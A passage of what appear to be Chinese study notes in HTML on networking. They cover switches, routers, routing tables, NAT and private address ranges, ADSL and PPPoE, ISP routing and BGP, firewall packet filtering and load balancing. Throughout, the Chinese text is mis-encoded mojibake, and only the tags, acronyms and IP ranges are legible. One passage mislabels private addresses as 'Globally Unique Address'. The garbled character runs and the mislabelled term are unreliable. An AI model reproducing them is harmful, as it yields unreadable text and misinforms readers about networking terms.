ä¹éƒ½æœ‰çš„æ“ä½œï¼Œå°†è¾“å…¥çš„ç”µä¿¡å·è½¬æ¢ä¸ºæ•°å­—ä¿¡å·ï¼Œç„¶åå°†æ•°å­—ä¿¡å·è½¬æ¢ä¸ºç”µä¿¡å·å‘é€å‡ºå»ã€‚</p><p>äº¤æ¢æœºç«¯å£çš„MACæ¨¡å—ä¸å…·æœ‰MACåœ°å€ã€‚</p><p>äº¤æ¢æœºä¸­ç™»è®°çš„MACåœ°å€å’Œç«¯å£å¯¹åº”ã€‚</p><h4 id="äº¤æ¢ç”µè·¯"><a href="#äº¤æ¢ç”µè·¯" class="headerlink" title="äº¤æ¢ç”µè·¯"></a>äº¤æ¢ç”µè·¯</h4><p>äº¤æ¢æœºç”±äº¤æ¢ç”µè·¯è€Œæ¥ã€‚</p><p>äº¤æ¢ç”µè·¯äº¤å‰ç‚¹å¤„çš„äº¤æ¢å¼€å…³ä¸ºç”µå­å¼€å…³ã€‚</p><p>å…¶åœ°å€è¡¨ä¼šè‡ªè¡Œæ›´æ–°æˆ–åˆ é™¤ã€‚</p><p>è‹¥æ²¡æœ‰æ¥æ”¶æ–¹çš„ç«¯å£ï¼Œåˆ™å¹¿æ’­åˆ°æ‰€æœ‰çš„ç«¯å£ã€‚</p><p>æ¥æ”¶è®¾å¤‡æ¥æ”¶åˆ°åŒ…åä¼šè¿”å›å“åº”ï¼Œè¿™æ ·äº¤æ¢æœºå°±å¯ä»¥è®°å½•ã€‚</p><h4 id="å…¨åŒå·¥æ¨¡å¼"><a href="#å…¨åŒå·¥æ¨¡å¼" class="headerlink" title="å…¨åŒå·¥æ¨¡å¼"></a>å…¨åŒå·¥æ¨¡å¼</h4><p>äº¤æ¢æœºç‰¹æœ‰ã€‚</p><p>ä¸ä½¿ç”¨é›†çº¿å™¨ï¼Œå°±å¯ä»¥é¿å…ä¿¡å·ç¢°æ’ã€‚</p><p>å·¥ä½œæ¨¡å¼ã€‚</p><h4 id="è¿æ¥è„‰å†²"><a href="#è¿æ¥è„‰å†²" class="headerlink" title="è¿æ¥è„‰å†²"></a>è¿æ¥è„‰å†²</h4><p>åœ¨ä»¥å¤ªç½‘ä¸­æ²¡æœ‰æ•°æ®ä¼ è¾“æ—¶ï¼Œå¡«å……çš„è„‰å†²ä¿¡å·ã€‚</p><p>æ£€æµ‹å¯¹æ–¹ç½‘çº¿æ˜¯å¦æ­£ç¡®è¿æ¥ã€‚</p><p>é€šè¿‡ç‰¹æ®Šçš„è„‰å†²åºåˆ—ã€‚<br>ä¹Ÿå¯ä»¥ç”¨äºäº¤æ¢è¿æ¥åŒæ–¹çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¦‚æ”¯æŒçš„å·¥ä½œæ¨¡å¼å’Œä¼ è¾“é€Ÿç‡ã€‚</p><h3 id="è·¯ç”±å™¨"><a href="#è·¯ç”±å™¨" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h3><p>äº¤æ¢æœºæ˜¯åŸºäºä»¥å¤ªç½‘è®¾ç½®çš„ï¼Œè·¯ç”±å™¨æ˜¯åŸºäºIPè®¾è®¡çš„ã€‚</p><p>è·¯ç”±å™¨çš„å„ä¸ªç«¯å£éƒ½å…·æœ‰MACåœ°å€å’ŒIPåœ°å€ã€‚</p><h4 id="è·¯ç”±è¡¨"><a href="#è·¯ç”±è¡¨" class="headerlink" title="è·¯ç”±è¡¨"></a>è·¯ç”±è¡¨</h4><p>è·¯ç”±è¡¨åŒ¹é…æ—¶ï¼ŒåªåŒ¹é…ç½‘ç»œå·éƒ¨åˆ†ã€‚</p><p><img src="/media/16517249101641.png"></p><h5 id="è·¯ç”±èšåˆ"><a href="#è·¯ç”±èšåˆ" class="headerlink" title="è·¯ç”±èšåˆ"></a>è·¯ç”±èšåˆ</h5><p>å°†è·¯ç”±è¡¨ä¸­å¤šä¸ªå­ç½‘åˆå¹¶ä¸ºä¸€ä¸ªå­ç½‘ã€‚</p><h5 id="å­ç½‘æ©ç åˆ—"><a href="#å­ç½‘æ©ç åˆ—" class="headerlink" title="å­ç½‘æ©ç åˆ—"></a>å­ç½‘æ©ç åˆ—</h5><p>è¡¨ç¤ºåŒ¹é…æ—¶éœ€è¦å¯¹æ¯”çš„æ¯”ç‰¹æ•°é‡ã€‚</p><h5 id="è·ƒç‚¹è®¡æ•°"><a href="#è·ƒç‚¹è®¡æ•°" class="headerlink" title="è·ƒç‚¹è®¡æ•°"></a>è·ƒç‚¹è®¡æ•°</h5><p>è¡¨ç¤ºè·ç¦»ç›®æ ‡IPåœ°å€çš„è¿œè¿‘ã€‚</p><h5 id="è·¯ç”±è¡¨ç»´æŠ¤"><a href="#è·¯ç”±è¡¨ç»´æŠ¤" class="headerlink" title="è·¯ç”±è¡¨ç»´æŠ¤"></a>è·¯ç”±è¡¨ç»´æŠ¤</h5><ul><li>æ‰‹åŠ¨ç»´æŠ¤</li><li>è·¯ç”±å™¨ä¹‹é—´ä¿¡æ¯äº¤æ¢</li></ul><h4 id="è·¯ç”±å™¨æ¥æ”¶åŒ…"><a href="#è·¯ç”±å™¨æ¥æ”¶åŒ…" class="headerlink" title="è·¯ç”±å™¨æ¥æ”¶åŒ…"></a>è·¯ç”±å™¨æ¥æ”¶åŒ…</h4><p>è·¯ç”±å™¨çš„ä¸€ä¸ªæ¥å£ç›¸å½“äºä¸€ä¸ªç½‘å¡ã€‚</p><p>é€‰æ‹©ï¼Œå­ç½‘æ©ç é•¿ï¼Œè·ƒç‚¹å°‘ã€‚</p><p>æ¥æ”¶ä¹‹åMACå¤´éƒ¨ä¼šè¢«ä¸¢å¼ƒã€‚</p><h5 id="é»˜è®¤è·¯ç”±"><a href="#é»˜è®¤è·¯ç”±" class="headerlink" title="é»˜è®¤è·¯ç”±"></a>é»˜è®¤è·¯ç”±</h5><p>å­ç½‘æ©ç ä¸º0.0.0.0ï¼Œä¸ºäº’è”ç½‘æ¥å…¥è·¯ç”±å™¨ï¼Œå½“è·¯ç”±è¡¨ä¸­æ²¡æœ‰åŒ¹é…åˆ°æ—¶è½¬å‘åˆ°è¿™é‡Œï¼Œè¿™é‡Œé…ç½®çš„ç½‘å…³åœ°å€ä¹Ÿå«é»˜è®¤ç½‘å…³ã€‚</p><h5 id="æ›´æ–°TTL"><a href="#æ›´æ–°TTL" class="headerlink" title="æ›´æ–°TTL"></a>æ›´æ–°TTL</h5><p>æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨è½¬å‘ï¼ŒTTL(Time To Live)çš„å€¼å°±ä¼šå‡ä¸€ï¼Œä¸ºé›¶æ—¶è¢«ä¸¢å¼ƒã€‚</p><h5 id="åˆ†ç‰‡å¤„ç†"><a href="#åˆ†ç‰‡å¤„ç†" class="headerlink" title="åˆ†ç‰‡å¤„ç†"></a>åˆ†ç‰‡å¤„ç†</h5><p>TCPçš„æ‹†åˆ†ï¼Œå°†æ•°æ®åˆ†ä¸ºåŒ…ï¼ŒIPçš„åˆ†ç‰‡ï¼Œå°†åŒ…å†æ‹†åˆ†ï¼Œæ­¤æ—¶è€ƒè™‘MTUã€‚</p><p>ä¸¤ç§æƒ…å†µä¸åˆ†ç‰‡ï¼š</p><ul><li>åº”ç”¨ç¨‹åºè®¾ç½®ä¸å…è®¸åˆ†ç‰‡</li><li>åŒ…å·²ç»è¢«åˆ†ç‰‡</li></ul><h4 id="è·¯ç”±å™¨å‘é€åŒ…"><a href="#è·¯ç”±å™¨å‘é€åŒ…" class="headerlink" title="è·¯ç”±å™¨å‘é€åŒ…"></a>è·¯ç”±å™¨å‘é€åŒ…</h4><p>è§„åˆ™å–å†³äºç«¯å£çš„ç±»å‹ã€‚</p><p>é‡æ–°æ·»åŠ MACå¤´éƒ¨ã€‚</p><p>ARPï¼Œé€šè¿‡IPæŸ¥MACã€‚</p><h4 id="è·¯ç”±å™¨ä¸äº¤æ¢æœºä¹‹é—´çš„å…³ç³»"><a href="#è·¯ç”±å™¨ä¸äº¤æ¢æœºä¹‹é—´çš„å…³ç³»" class="headerlink" title="è·¯ç”±å™¨ä¸äº¤æ¢æœºä¹‹é—´çš„å…³ç³»"></a>è·¯ç”±å™¨ä¸äº¤æ¢æœºä¹‹é—´çš„å…³ç³»</h4><p>å°±æ˜¯IPä¸ä»¥å¤ªç½‘ä¹‹é—´çš„å…³ç³»è·¯ç”±å™¨å°†åŒ…çš„ä¼ è¾“å·¥ä½œäº¤ç»™äº¤æ¢æœºè¿›è¡Œã€‚</p><h4 id="IPä¸è´Ÿè´£åŒ…çš„ä¼ é€"><a href="#IPä¸è´Ÿè´£åŒ…çš„ä¼ é€" class="headerlink" title="IPä¸è´Ÿè´£åŒ…çš„ä¼ é€"></a>IPä¸è´Ÿè´£åŒ…çš„ä¼ é€</h4><p>åªæ˜¯å§”æ‰˜å„ç§é€šä¿¡æŠ€æœ¯å°†åŒ…ä¼ è¾“åˆ°ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚</p><h4 id="è·¯ç”±å™¨çš„é™„åŠ åŠŸèƒ½"><a href="#è·¯ç”±å™¨çš„é™„åŠ åŠŸèƒ½" class="headerlink" title="è·¯ç”±å™¨çš„é™„åŠ åŠŸèƒ½"></a>è·¯ç”±å™¨çš„é™„åŠ åŠŸèƒ½</h4><p>ä¸»è¦æ˜¯ä¸¤ä¸ªï¼š</p><ul><li>åœ°å€è¿‡æ»¤</li><li>åŒ…è¿‡æ»¤</li></ul><h5 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h5><p>å†…ç½‘å’Œå¤–ç½‘ã€‚</p><p>å†…ç½‘çš„è®¾ç«‹ï¼Œè§£å†³åœ°å€ä¸è¶³çš„é—®é¢˜ã€‚</p><p>å†…ç½‘ä¸å†…ç½‘ä¹‹é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„,ä½†ä¸æ˜¯å®Œå…¨ç‹¬ç«‹ã€‚</p><p>å†…ç½‘çš„ç½‘ç»œåŒ…åªåœ¨å†…ç½‘ä¹‹é—´æµåŠ¨ã€‚</p><p>ä½œç”¨äºå†…ç½‘çš„åœ°å€å«ç§æœ‰åœ°å€(Globally Unique Address),åŸæ¥çš„å›ºå®šåœ°å€å«å…±æœ‰åœ°å€(Public Address)</p><p>ç§æœ‰åœ°å€èŒƒå›´ï¼š</p><ul><li>10.0.0.0~10.255.255.255</li><li>172.16.0.0~172.31.255.255</li><li>192.168.0.0~192.168.255.255</li></ul><p>å†…ç½‘åˆ†ä¸¤éƒ¨åˆ†ï¼š</p><ul><li>å¯¹äº’è”ç½‘å¼€æ”¾çš„æœåŠ¡å™¨ã€‚åˆ†é…å…¬æœ‰åœ°å€ï¼Œå¯ä»¥å’Œäº’è”ç½‘ç›´æ¥é€šä¿¡ã€‚</li><li>å…¬å¸å†…éƒ¨è®¾å¤‡ã€‚åˆ†é…ç§æœ‰åœ°å€ï¼Œä¸èƒ½å’Œäº’è”ç½‘ç›´æ¥æ”¶å‘ç½‘ç»œåŒ…ã€‚</li></ul><p>åœ°å€è½¬æ¢æœºåˆ¶ï¼ŒåŸºæœ¬åŸç†ï¼Œåœ¨è½¬å‘ç½‘ç»œåŒ…æ—¶ä¿®æ”¹IPå¤´éƒ¨ä¸­çš„IPåœ°å€å’Œç«¯å£å·ã€‚</p><p>å®¶åº­ç½‘ç»œä¸­çš„è¿‡ç¨‹ä¹Ÿç›¸åŒã€‚</p><p>æ”¹å†™ç«¯å£å·ï¼Œä»ç©ºé—²çš„ç«¯å£ä¸­éšæœºé€‰æ‹©ã€‚</p><p>é™¤éå…¬å¸å…è®¸ï¼Œæ— æ³•ä»äº’è”ç½‘å‘å…¬å¸å†…ç½‘å‘é€ç½‘ç»œåŒ…ï¼Œ(å¯¹åº”è¡¨ä¸­æ— è®°å½•)å…·å¤‡é˜²æ­¢éæ³•å…¥ä¾µçš„æ•ˆæœã€‚</p><p>å¯ä»¥å°†æœåŠ¡å™¨çš„ç§æœ‰åœ°å€æ‰‹åŠ¨é…ç½®åœ¨åœ°å€è½¬æ¢è®¾å¤‡ä¸­ï¼Œå°±å¯ä»¥ä»äº’è”ç½‘è®¿é—®è¿™ä¸ªæœåŠ¡å™¨äº†ã€‚</p><h5 id="åŒ…è¿‡æ»¤"><a href="#åŒ…è¿‡æ»¤" class="headerlink" title="åŒ…è¿‡æ»¤"></a>åŒ…è¿‡æ»¤</h5><p>è·¯ç”±å™¨åœ¨å¯¹åŒ…è¿›è¡Œè½¬æ¢æ—¶ï¼Œæ ¹æ®MACåœ°å€ã€IPåœ°å€ã€TCPå¤´éƒ¨çš„å†…å®¹ï¼ŒæŒ‰ç…§äº‹å…ˆè®¾ç½®å¥½çš„è§„åˆ™å†³å®šæ˜¯è½¬å‘è¿˜æ˜¯ä¸¢å¼ƒè¿™ä¸ªåŒ…ã€‚</p><p>é˜²ç«å¢™è®¾å¤‡æˆ–è½¯ä»¶ï¼Œå¤§å¤šåˆ©ç”¨è¿™ä¸€æœºåˆ¶ã€‚</p><h4 id="hubè§£æ"><a href="#hubè§£æ" class="headerlink" title="hubè§£æ"></a>hubè§£æ</h4><p>hubï¼Œè½´ã€‚</p><p>ç°å®å¯æƒ³è±¡ä¸ºï¼Œè‡ªè¡Œè½¦è½®ï¼Œè¾æ¡ä»è½¦è½®è¾¹ç¼˜ä¸€ç›´æ±‡èšåˆ°è½´å¤„ã€‚</p><p>ç½‘ç»œå¯æƒ³è±¡ä¸ºï¼Œç½‘çº¿èšé›†çš„åœ°æ–¹ã€‚</p><p>å°å‹å»‰ä»·çš„æ™®åŠå‹äº§å“ä¸€èˆ¬å«äº¤æ¢æœºï¼Œå¤§å‹çš„é«˜æ€§èƒ½äº§å“ä¸€èˆ¬å«äºŒå±‚äº¤æ¢æœºã€‚</p><h2 id="å…‰çº¤æ¥å…¥ç½‘"><a href="#å…‰çº¤æ¥å…¥ç½‘" class="headerlink" title="å…‰çº¤æ¥å…¥ç½‘"></a>å…‰çº¤æ¥å…¥ç½‘</h2><p>FTTHï¼ŒFiber To The Homeï¼Œ</p><h2 id="ADSL"><a href="#ADSL" class="headerlink" title="ADSL"></a>ADSL</h2><p>Asymmetric Digital Subscriber Line,ä¸å¯¹ç§°æ•°å­—ç”¨æˆ·çº¿ï¼Œä¸€ç§åˆ©ç”¨æ¶è®¾åœ¨ç”µçº¿æ†ä¸Šçš„é‡‘å±ç”µè¯çº¿æ¥è¿›è¡Œé«˜é€Ÿé€šä¿¡çš„æŠ€æœ¯ã€‚</p><p>å®ƒçš„ä¸Šè¡Œæ–¹å‘(ç”¨æˆ·åˆ°äº’è”ç½‘)å’Œä¸‹è¡Œæ–¹å‘(äº’è”ç½‘åˆ°ç”¨æˆ·)çš„é€šä¿¡é€Ÿç‡æ˜¯ä¸å¯¹ç§°çš„ã€‚</p><p>åŒç»çº¿çš„æé™è·ç¦»æ˜¯100ç±³ï¼Œå…‰çº¤å¯è¾¾å‡ å…¬é‡Œã€‚</p><hr><p>äº’è”ç½‘ä¸­ç½‘ç»œé—´çš„è·ç¦»å’Œè·¯ç”±çš„ç»´æŠ¤æ–¹å¼å’Œå®¶åº­ã€å…¬å¸ä¸åŒã€‚</p><h2 id="Modem"><a href="#Modem" class="headerlink" title="Modem"></a>Modem</h2><p>è°ƒåˆ¶è§£è°ƒå™¨ã€‚</p><p>Modulator(è°ƒåˆ¶å™¨)å’ŒDemodulator(è§£è°ƒå™¨)çš„ç®€ç§°ã€‚</p><p>è°ƒåˆ¶ï¼Œmodulateï¼Œå³æŠŠæ•°å­—ä¿¡å·è½¬æ¢æˆç”µè¯çº¿ä¸Šä¼ è¾“çš„æ¨¡æ‹Ÿä¿¡å·ã€‚</p><p>è§£è°ƒï¼Œdemodulateï¼ŒæŠŠæ¨¡æ‹Ÿä¿¡å·è½¬æ¢æˆæ•°å­—ä¿¡å·ã€‚</p><h2 id="BAS"><a href="#BAS" class="headerlink" title="BAS"></a>BAS</h2><p>Broadband Access Server.å®½å¸¦æ¥å…¥æœåŠ¡å™¨ï¼Œæ˜¯ä¸€ç§è·¯ç”±å™¨ã€‚</p><h2 id="PPP"><a href="#PPP" class="headerlink" title="PPP"></a>PPP</h2><p>Point-to-Point Protocol,ç‚¹åˆ°ç‚¹åè®®ã€‚</p><p>ä¸‰ä¸ªå¤´éƒ¨ï¼ŒMACå¤´éƒ¨ã€PPPoEå¤´éƒ¨ã€PPPå¤´éƒ¨ã€‚</p><h2 id="ADSL-Modem-å¯¹åŒ…çš„æ‹†åˆ†"><a href="#ADSL-Modem-å¯¹åŒ…çš„æ‹†åˆ†" class="headerlink" title="ADSL Modem å¯¹åŒ…çš„æ‹†åˆ†"></a>ADSL Modem å¯¹åŒ…çš„æ‹†åˆ†</h2><p>æ‹†åˆ†ä¸ºå¾ˆå¤šå°æ ¼å­ï¼Œç§°ä¿¡å…ƒã€‚</p><p>ä¿¡å…ƒæ˜¯å°æ•°æ®å—ï¼ŒåŒ…å«5å­—èŠ‚å¤´éƒ¨å’Œ48å­—èŠ‚æ•°æ®ï¼Œç”¨äºATM(Asynchronous Transfer Mode)å¼‚æ­¥ä¼ è¾“</p><h3 id="ADSL-Modemå¯¹ä¿¡å·çš„è°ƒåˆ¶"><a href="#ADSL-Modemå¯¹ä¿¡å·çš„è°ƒåˆ¶" class="headerlink" title="ADSL Modemå¯¹ä¿¡å·çš„è°ƒåˆ¶"></a>ADSL Modemå¯¹ä¿¡å·çš„è°ƒåˆ¶</h3><p>ä¸ç”¨æ–¹æ³¢çš„åŸå› ï¼š</p><ul><li>æ³¢å½¢æ˜“å¤±çœŸ</li><li>éš¾ä»¥æ§åˆ¶å™ªå£°</li></ul><p>è°ƒåˆ¶ä¸ºæ­£å¼¦æ³¢ã€‚<br>æŒ¯å¹…è°ƒåˆ¶ASKï¼Œç›¸ä½è°ƒåˆ¶PSKç»„æˆæ­£äº¤æŒ¯å¹…è°ƒåˆ¶QAMã€‚</p><p><img src="/media/16517943441373.png"></p><p>å…¶å°†ä¿¡å…ƒè½¬æ¢ä¸ºç”µä¿¡å·ã€‚</p><p>åˆ†ç¦»å™¨ï¼Œå°†ç”µè¯ä¿¡å·å’ŒADSLä¿¡å·åˆ†ç¦»ã€‚</p><p>IDF(Intermediate Distribution Frame)ä¸­é—´é…çº¿ç›˜ï¼ŒMDF(Main Distribution Frame)ä¸»é…çº¿ç›˜ã€‚</p><p>ä¿å®‰å™¨ï¼Œé˜²æ­¢é›·ç”µç­‰æƒ…å†µä¸‹ç”µè¯çº¿ä¸­äº§ç”Ÿè¿‡å¤§ç”µæµçš„ä¸€ç§ä¿æŠ¤è£…ç½®ï¼Œå†…éƒ¨æœ‰ä¿é™©ä¸ã€‚</p><h3 id="ä¿¡å·çº¿"><a href="#ä¿¡å·çº¿" class="headerlink" title="ä¿¡å·çº¿"></a>ä¿¡å·çº¿</h3><p>ç›´å¾„ä¸åŒï¼Œä¿¡å·è¡°å‡ç‡ç­‰å¾…æ€§ä¸åŒã€‚</p><p>çº¿è¶Šç»†è¡°å‡ç‡è¶Šé«˜ã€‚<br><img src="/media/16517952103552.png"></p><p>ç”µç¼†éš§é“ï¼Œåœ°ä¸‹ç”µç¼†ã€‚</p><h3 id="ISDN"><a href="#ISDN" class="headerlink" title="ISDN"></a>ISDN</h3><p>Integrated Services Digital Networkï¼Œç»¼åˆä¸šåŠ¡æ•°å­—ç½‘ã€‚</p><h3 id="DSLAM"><a href="#DSLAM" class="headerlink" title="DSLAM"></a>DSLAM</h3><h3 id="POPå’ŒNOC"><a href="#POPå’ŒNOC" class="headerlink" title="POPå’ŒNOC"></a>POPå’ŒNOC</h3><p>éƒ½ä½äºä¸€ä¸ªè¿è¥å•†ä¸­ã€‚</p><p>POPï¼ŒPoint Of Presense, æ¥å…¥ç‚¹ã€‚å…¶æœ¬è´¨æ˜¯å„ç§ç±»å‹çš„è·¯ç”±å™¨ï¼Œå–å†³äºæ¥å…¥ç±»å‹ï¼Œè¿˜æœ‰äº¤æ¢æœºã€‚</p><p>POPå¤„çš„è·¯ç”±å™¨éœ€å¤§é‡ç«¯å£ï¼Œå…¶é€Ÿç‡ä½äºæ ¸å¿ƒç½‘ç»œã€‚</p><p>NOCï¼ŒNetwork Operation Center, ç½‘ç»œè¿è¡Œä¸­å¿ƒï¼Œé›†ä¸­POPä¼ æ¥çš„åŒ…ï¼Œå¯ä»è¿™é‡Œè½¬å‘è‡³ç¦»ç›®çš„åœ°æ›´è¿‘çš„POPæˆ–è½¬å‘è‡³å…¶ä»–è¿è¥å•†ã€‚ </p><p>NOCå’ŒPOæ²¡æœ‰ä¸¥æ ¼çš„ç•Œå®šã€‚å¯ä»¥è®¤ä¸ºNOCæ˜¯è§„æ¨¡æ‰©å¤§çš„POPã€‚</p><h3 id="å…‰çº¤é“ºè®¾"><a href="#å…‰çº¤é“ºè®¾" class="headerlink" title="å…‰çº¤é“ºè®¾"></a>å…‰çº¤é“ºè®¾</h3><p>åœ°ä¸‹ã€‚</p><p>å…‰çº¤å¯ä»¥å¤ç”¨ã€‚<br><img src="/media/16521403771184.png"></p><h3 id="è¿è¥å•†ä¹‹é—´çš„è·¯ç”±äº¤æ¢"><a href="#è¿è¥å•†ä¹‹é—´çš„è·¯ç”±äº¤æ¢" class="headerlink" title="è¿è¥å•†ä¹‹é—´çš„è·¯ç”±äº¤æ¢"></a>è¿è¥å•†ä¹‹é—´çš„è·¯ç”±äº¤æ¢</h3><p>ç›¸è¿çš„è·¯ç”±å™¨å‘ŠçŸ¥è·¯ç”±ä¿¡æ¯ã€‚</p><p>è½¬æ¥ï¼Œå¯¹ç­‰ã€‚</p><p>å…¬å¸å†…éƒ¨å¯é‡‡ç”¨æœ€çŸ­è·¯ç”±ã€‚</p><p>è¿è¥å•†ä¹‹é—´çš„è·¯ç”±äº¤æ¢éœ€è¿›è¡Œç­›é€‰ã€‚</p><h3 id="BGPåè®®"><a href="#BGPåè®®" class="headerlink" title="BGPåè®®"></a>BGPåè®®</h3><p>Border Gateway Protocol.</p><h3 id="IX"><a href="#IX" class="headerlink" title="IX"></a>IX</h3><p>Internet eXchange,äº’è”ç½‘äº¤æ¢ä¸­å¿ƒã€‚è¿è¥å•†çº¿è·¯çš„ä¸­å¿ƒï¼Œç›¸å½“äºæ˜¯é›†è¿è¥å•†ä¹‹é—´ä¸€å¯¹ä¸€è¿æ¥çš„çº¿ã€‚</p><p>IXçš„æ ¸å¿ƒæ˜¯å…·æœ‰å¤§é‡é«˜é€Ÿçš„ä»¥å¤ªç½‘ç«¯å£çš„äºŒå±‚äº¤æ¢æœº(åŸºæœ¬åŸç†å’Œä¸€å±‚äº¤æ¢æœºç›¸åŒ)ã€‚</p><h3 id="æœåŠ¡å™¨å’Œè·¯ç”±å™¨"><a href="#æœåŠ¡å™¨å’Œè·¯ç”±å™¨" class="headerlink" title="æœåŠ¡å™¨å’Œè·¯ç”±å™¨"></a>æœåŠ¡å™¨å’Œè·¯ç”±å™¨</h3><p>è®¡ç®—æœºéƒ½èƒ½å®Œæˆè·¯ç”±å™¨çš„å·¥ä½œï¼Œåªè¦æœ‰ç›¸åº”çš„è½¯ä»¶ï¼Œä¸€èˆ¬è·¯ç”±å™¨ä¸Šå®‰è£…çš„å°±æ˜¯Linuxæ“ä½œç³»ç»Ÿã€‚</p><h1 id="ç¬¬äº”ç« "><a href="#ç¬¬äº”ç« " class="headerlink" title="ç¬¬äº”ç« "></a>ç¬¬äº”ç« </h1><h2 id="é˜²ç«å¢™åŸç†"><a href="#é˜²ç«å¢™åŸç†" class="headerlink" title="é˜²ç«å¢™åŸç†"></a>é˜²ç«å¢™åŸç†</h2><p>firewallã€‚</p><p>æ ¹æ®MACåœ°å€ï¼ŒIPå¤´éƒ¨ï¼ŒTCPå¤´éƒ¨çš„å†…å®¹ï¼Œæ¥å†³å®šæ˜¯è½¬å‘è¿˜æ˜¯ä¸¢å¼ƒã€‚</p><p>åªå…è®¸æŒ‡å®šåº”ç”¨ç¨‹åºçš„ç½‘ç»œåŒ…å‘é€ã€‚</p><h3 id="åŒ…è¿‡æ»¤-1"><a href="#åŒ…è¿‡æ»¤-1" class="headerlink" title="åŒ…è¿‡æ»¤"></a>åŒ…è¿‡æ»¤</h3><p>é€šè¿‡æ¥æ”¶æ–¹IPåœ°å€ã€å‘é€æ–¹IPåœ°å€ã€æ¥æ”¶æ–¹ç«¯å£å·ã€å‘é€æ–¹ç«¯å£å·ã€TCPæ§åˆ¶ä½è¿™äº›æ¡ä»¶ï¼Œåˆ¤æ–­å‡ºé€šä¿¡çš„èµ·ç‚¹å’Œç»ˆç‚¹ã€åº”ç”¨ç¨‹åºç§ç±»ã€‚</p><h4 id="TCPè¿æ¥æ—¶çš„ä¸‰ä¸ªåŒ…çš„æ§åˆ¶ä½"><a href="#TCPè¿æ¥æ—¶çš„ä¸‰ä¸ªåŒ…çš„æ§åˆ¶ä½" class="headerlink" title="TCPè¿æ¥æ—¶çš„ä¸‰ä¸ªåŒ…çš„æ§åˆ¶ä½"></a>TCPè¿æ¥æ—¶çš„ä¸‰ä¸ªåŒ…çš„æ§åˆ¶ä½</h4><p>ç¬¬ä¸€ä¸ªåŒ…ï¼ŒSYNä¸º1ï¼ŒACKä¸º0.</p><p>ç”¨äºé˜»æ­¢WebæœåŠ¡å™¨ä¸ºèµ·ç‚¹è®¿é—®äº’è”ç½‘ã€‚</p><h4 id="æ— æ³•é˜»æ­¢å¯¹DNSæœåŠ¡å™¨çš„è®¿é—®"><a href="#æ— æ³•é˜»æ­¢å¯¹DNSæœåŠ¡å™¨çš„è®¿é—®" class="headerlink" title="æ— æ³•é˜»æ­¢å¯¹DNSæœåŠ¡å™¨çš„è®¿é—®"></a>æ— æ³•é˜»æ­¢å¯¹DNSæœåŠ¡å™¨çš„è®¿é—®</h4><p>ä½¿ç”¨UDPåè®®çš„éƒ½ä¼šæœ‰è¿™æ ·çš„é—®é¢˜ã€‚</p><p>åªèƒ½äºŒé€‰ä¸€ï¼Œè¦ä¹ˆå…è®¸è¯¥åº”ç”¨ç¨‹åºçš„æ‰€æœ‰åŒ…é€šè¿‡ï¼Œè¦ä¹ˆé˜»æ­¢ã€‚</p><h4 id="é€šè¿‡é˜²ç«å¢™"><a href="#é€šè¿‡é˜²ç«å¢™" class="headerlink" title="é€šè¿‡é˜²ç«å¢™"></a>é€šè¿‡é˜²ç«å¢™</h4><p>è¢«é˜»æ­¢çš„åŒ…ä¼šè¢«ä¸¢å¼ƒå¹¶è®°å½•ä¸‹æ¥ã€‚</p><p>è‹¥å…è®¸é€šè¿‡ï¼Œåˆ™è½¬å‘ã€‚</p><h4 id="é˜²ç«å¢™æ— æ³•æŠµå¾¡çš„æ”»å‡»"><a href="#é˜²ç«å¢™æ— æ³•æŠµå¾¡çš„æ”»å‡»" class="headerlink" title="é˜²ç«å¢™æ— æ³•æŠµå¾¡çš„æ”»å‡»"></a>é˜²ç«å¢™æ— æ³•æŠµå¾¡çš„æ”»å‡»</h4><p>éœ€è¦æ£€æŸ¥å†…å®¹çš„æ”»å‡»ã€‚</p><p>é˜²ç«å¢™æ— æ³•æ£€æŸ¥åŒ…çš„å†…å®¹ã€‚</p><p>æ–¹æ³•ï¼Œéƒ¨ç½²ç”¨æ¥æ£€æŸ¥å†…å®¹çš„è®¾å¤‡æˆ–è½¯ä»¶ã€‚</p><h3 id="è´Ÿè½½å‡è¡¡"><a href="#è´Ÿè½½å‡è¡¡" class="headerlink" title="è´Ÿè½½å‡è¡¡"></a>è´Ÿè½½å‡è¡¡</h3><p>å¤šå°æœåŠ¡å™¨åˆ†æ‹…è´Ÿè½½ï¼Œè¿™ç§æ¶æ„ç§°åˆ†å¸ƒå¼æ¶æ„ã€‚</p><h4 id="è½®è¯¢åˆ†é…"><a href="#è½®è¯¢åˆ†é…" class="headerlink" title="è½®è¯¢åˆ†é…"></a>è½®è¯¢åˆ†é…</h4><p>é€šè¿‡è½®è¯¢(round-robin)çš„æ–¹å¼å°†è®¿é—®å¹³å‡åˆ†é…ç»™æ‰€æœ‰æœåŠ¡å™¨</p><p>é€šè¿‡DNSæœåŠ¡å™¨æ¥å®ç°ã€‚</p><p>é€šè¿‡DNSæœåŠ¡å™¨æŸ¥è¯¢æœåŠ¡å™¨åç§°æ—¶ï¼Œå…¶è¿”å›å¤šä¸ªIPåœ°å€ã€‚</p><h4 id="è´Ÿè½½å‡è¡¡å™¨"><a href="#è´Ÿè½½å‡è¡¡å™¨" class="headerlink" title="è´Ÿè½½å‡è¡¡å™¨"></a>è´Ÿè½½å‡è¡¡å™¨</h4><p>è´Ÿè½½å‡è¡¡çš„ä½œç”¨æ˜¯åˆ†æµï¼Œè€Œéš¾ç‚¹åœ¨äºåˆ¤æ–­ä»€ä¹ˆæ—¶å€™ä¸åˆ†æµã€‚</p><h4 id="åˆ¤æ–­è¯·æ±‚ç›¸å…³æ€§çš„ä¿¡æ¯"><a href="#åˆ¤æ–­è¯·æ±‚ç›¸å…³æ€§çš„ä¿¡æ¯" class="headerlink" title="åˆ¤æ–­è¯·æ±‚ç›¸å…³æ€§çš„ä¿¡æ¯"></a>åˆ¤æ–­è¯·æ±‚ç›¸å…³æ€§çš„ä¿¡æ¯</h4><p>åœ¨è¡¨å•ä¸­åŠ å…¥è¡¨ç¤ºå…³è”çš„ä¿¡æ¯æˆ–åœ¨HTTPå¤´éƒ¨å­—æ®µä¸­åŠ ä¸Šç”¨æ¥åˆ¤æ–­ç›¸å…³æ€§çš„ä¿¡æ¯(cookie).</p><h4 id="ä½¿ç”¨ç¼“å­˜æœåŠ¡å™¨åˆ†æ‹…è´Ÿè½½"><a 